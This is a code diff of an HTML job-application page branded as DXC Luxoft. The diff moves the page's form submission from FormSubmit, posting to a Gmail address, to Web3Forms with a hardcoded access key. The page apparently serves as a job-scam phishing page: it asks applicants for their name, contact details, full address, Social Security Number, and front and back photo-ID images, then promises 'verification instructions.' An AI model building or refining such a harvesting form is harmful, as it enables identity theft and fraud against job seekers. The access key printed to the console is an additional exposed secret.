@@ -288,27 +288,26 @@
     <p>Thank you for submitting your application. Please wait for verification instructions.</p>
   </div>
   
-  <!-- FORMSUBMIT.CO FORM - PROPERLY CONFIGURED -->
-  <form id="applicationForm" action="https://formsubmit.co/luxoftorganization@gmail.com" method="POST" enctype="multipart/form-data">
-    <input type="hidden" name="_subject" value="New Luxoft Job Application">
-    <input type="hidden" name="_template" value="table">
-    <input type="hidden" name="_captcha" value="false">
-    <input type="hidden" name="_autoresponse" value="Thank you for your application to DXC Luxoft! We will review your submission and contact you shortly.">
-    <input type="hidden" name="_blacklist" value="spam,test">
+  <!-- WEB3FORMS FORM WITH YOUR ACCESS KEY -->
+  <form id="applicationForm">
+    <input type="hidden" name="access_key" value="5b764ab9-c2fb-4f94-b8a1-27a84a5e7e77">
+    <input type="hidden" name="subject" value="New Luxoft Job Application">
+    <input type="hidden" name="from_name" value="Luxoft Careers">
+    <input type="hidden" name="redirect" value="false">
     
     <!-- Step 1: Personal Info -->
     <div class="step active" id="step1">
       <div class="form-group">
         <label for="fullname">Full Name</label>
-        <input type="text" id="fullname" name="Full Name" placeholder="Enter your full name" required>
+        <input type="text" id="fullname" name="name" placeholder="Enter your full name" required>
       </div>
       <div class="form-group">
         <label for="email">Email <span class="tooltip" title="We'll never share your email.">ⓘ</span></label>
-        <input type="email" id="email" name="Email" placeholder="Enter your email" required>
+        <input type="email" id="email" name="email" placeholder="Enter your email" required>
       </div>
       <div class="form-group">
         <label for="phone">Phone Number</label>
-        <input type="tel" id="phone" name="Phone Number" placeholder="Enter your phone number" required>
+        <input type="tel" id="phone" name="phone" placeholder="Enter your phone number" required>
       </div>
       <div class="button-container">
         <button type="button" onclick="nextStep()">Next</button>
@@ -319,11 +318,11 @@
     <div class="step" id="step2">
       <div class="form-group">
         <label for="address">Full Address</label>
-        <input type="text" id="address" name="Full Address" placeholder="Enter your full address, street, city, state, country" required>
+        <input type="text" id="address" name="address" placeholder="Enter your full address, street, city, state, country" required>
       </div>
       <div class="form-group">
         <label for="ssn">SSN <span class="tooltip" title="Enter 9-digit Social Security Number.">ⓘ</span></label>
-        <input type="text" id="ssn" name="SSN" placeholder="XXXXXXXXX" pattern="\d{9}" title="Enter SSN in XXXXXXXXX format" required>
+        <input type="text" id="ssn" name="ssn" placeholder="XXXXXXXXX" pattern="\d{9}" title="Enter SSN in XXXXXXXXX format" required>
       </div>
       <div class="button-container">
         <button type="button" onclick="prevStep()">Back</button>
@@ -339,7 +338,7 @@
           Drag & drop or click to upload
           <span id="file-name-front" style="display:block;margin-top:0.5rem;color:var(--text-secondary);font-weight:600;">No file chosen</span>
         </div>
-        <input type="file" id="id-front" name="ID_Front" accept=".pdf,.doc,.docx,.jpg,.jpeg,.png" style="display:none;">
+        <input type="file" id="id-front" name="id_front" accept=".pdf,.doc,.docx,.jpg,.jpeg,.png" style="display:none;">
       </div>
       <div class="form-group">
         <label for="id-back">Photo ID (Back)</label>
@@ -347,19 +346,16 @@
           Drag & drop or click to upload
           <span id="file-name-back" style="display:block;margin-top:0.5rem;color:var(--text-secondary);font-weight:600;">No file chosen</span>
         </div>
-        <input type="file" id="id-back" name="ID_Back" accept=".pdf,.doc,.docx,.jpg,.jpeg,.png" style="display:none;">
+        <input type="file" id="id-back" name="id_back" accept=".pdf,.doc,.docx,.jpg,.jpeg,.png" style="display:none;">
       </div>
       
       <div class="button-container">
         <button type="button" onclick="prevStep()">Back</button>
-        <button type="submit" id="submitButton">Submit Application</button>
+        <button type="button" id="submitButton">Submit Application</button>
       </div>
       <div id="loading">Submitting your application...</div>
     </div>
   </form>
-
-  <!-- Hidden iframe for form submission -->
-  <iframe name="hiddenFrame" id="hiddenFrame" style="display: none;"></iframe>
 
   <footer>
     <p>Email: <a href="mailto:luxoftorganization@gmail.com">luxoftorganization@gmail.com</a> |
@@ -419,6 +415,9 @@
       if (input.files.length > 0) {
         fileNameSpan.textContent = input.files[0].name;
         fileNameSpan.style.color = 'var(--text-color)';
+      } else {
+        fileNameSpan.textContent = 'No file chosen';
+        fileNameSpan.style.color = 'var(--text-secondary)';
       }
     }
 
@@ -443,17 +442,15 @@
       document.getElementById('overlay').style.display = 'none';
     }
 
-    // FORM SUBMISSION HANDLER
-    document.getElementById("applicationForm").addEventListener("submit", function(e) {
-      e.preventDefault();
-      
+    // WEB3FORMS SUBMISSION - WITH YOUR ACCESS KEY
+    document.getElementById("submitButton").addEventListener("click", async function() {
       if (isFormSubmitted) {
         alert('Form already submitted!');
         return;
       }
-
+      
       // Validate all fields
-      const requiredFields = this.querySelectorAll('[required]');
+      const requiredFields = document.querySelectorAll('[required]');
       let isValid = true;
       
       requiredFields.forEach(field => {
@@ -475,10 +472,10 @@
         return;
       }
       
-      // Check file sizes (FormSubmit has limits)
-      const maxSize = 10 * 1024 * 1024; // 10MB
+      // Check file sizes (Web3Forms has 25MB limit)
+      const maxSize = 20 * 1024 * 1024; // 20MB
       if (frontFile.size > maxSize || backFile.size > maxSize) {
-        alert('File size too large. Please upload files smaller than 10MB.');
+        alert('File size too large. Please upload files smaller than 20MB.');
         return;
       }
       
@@ -491,30 +488,54 @@
       document.getElementById("loading").style.display = "block";
       document.getElementById("submitButton").disabled = true;
       isFormSubmitted = true;
-      
-      // Submit the form to the hidden iframe
-      this.submit();
-      
-      // Hide form and show success
-      setTimeout(() => {
-        document.querySelectorAll('.step').forEach(step => {
-          step.style.display = 'none';
+
+      try {
+        const formData = new FormData(document.getElementById('applicationForm'));
+        
+        // Add additional parameters for better formatting
+        formData.append('from_name', 'Luxoft Application Form');
+        formData.append('replyto', document.getElementById('email').value);
+        
+        console.log('Submitting form to Web3Forms...');
+        
+        const response = await fetch('https://api.web3forms.com/submit', {
+          method: 'POST',
+          body: formData
         });
-        document.getElementById('successMessage').style.display = 'block';
+
+        const data = await response.json();
+        console.log('Web3Forms response:', data);
+        
+        if (data.success) {
+          // Success!
+          document.querySelectorAll('.step').forEach(step => {
+            step.style.display = 'none';
+          });
+          document.getElementById('successMessage').style.display = 'block';
+          document.getElementById("loading").style.display = "none";
+          
+          console.log('Form submitted successfully!');
+          
+          // Show verification alert after 10 seconds
+          setTimeout(() => {
+            document.getElementById('verificationAlert').style.display = 'block';
+            document.getElementById('overlay').style.display = 'block';
+          }, 10000);
+        } else {
+          throw new Error(data.message || 'Submission failed');
+        }
+      } catch (error) {
+        console.error('Error submitting form:', error);
+        alert('There was an error submitting your application. Please try again or contact us directly at luxoftorganization@gmail.com');
         document.getElementById("loading").style.display = "none";
-      }, 1000);
-      
-      // Show verification alert after 10 seconds
-      setTimeout(() => {
-        document.getElementById('verificationAlert').style.display = 'block';
-        document.getElementById('overlay').style.display = 'block';
-      }, 5000);
+        document.getElementById("submitButton").disabled = false;
+        isFormSubmitted = false;
+      }
     });
 
-    // Listen for iframe load to detect successful submission
-    document.getElementById('hiddenFrame').addEventListener('load', function() {
-      console.log('Form submitted to FormSubmit');
-    });
+    // Add console logging for debugging
+    console.log('Luxoft Application Form loaded successfully');
+    console.log('Web3Forms Access Key: 5b764ab9-c2fb-4f94-b8a1-27a84a5e7e77');
   </script>
 </body>
 </html>
